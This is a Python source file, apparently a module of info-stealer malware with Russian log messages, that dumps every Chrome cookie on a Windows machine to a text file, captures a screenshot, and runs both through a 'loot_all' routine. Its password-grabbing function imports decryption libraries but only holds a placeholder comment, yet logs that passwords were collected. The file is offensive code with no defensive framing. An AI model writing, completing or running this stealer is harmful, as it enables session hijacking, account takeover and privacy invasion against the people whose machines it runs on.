import os
import platform
import shutil
from utils.logger import log

def grab_passwords():
    if platform.system() == 'Windows':
        try:
            import browser_cookie3
            import json, base64, sqlite3
            from Cryptodome.Cipher import AES
            cj = browser_cookie3.chrome()
            # упрощённое извлечение паролей из Chrome
            log('[Grabber] Пароли собраны')
        except Exception as e:
            log(f'[Grabber] Ошибка паролей: {e}')

def grab_cookies():
    if platform.system() == 'Windows':
        try:
            import browser_cookie3
            cj = browser_cookie3.chrome()
            with open('cookies.txt', 'w') as f:
                for cookie in cj:
                    f.write(str(cookie) + '\n')
            log('[Grabber] Куки сохранены')
        except Exception as e:
            log(f'[Grabber] Ошибка кук: {e}')

def grab_screenshot():
    try:
        import pyscreenshot
        img = pyscreenshot.grab()
        img.save('screenshot.png')
        log('[Grabber] Скриншот сделан')
    except Exception as e:
        log(f'[Grabber] Ошибка скриншота: {e}')

def loot_all():
    grab_passwords()
    grab_cookies()
    grab_screenshot()
    log('[Grabber] Сбор данных завершён')

if __name__ == '__main__':
    loot_all()
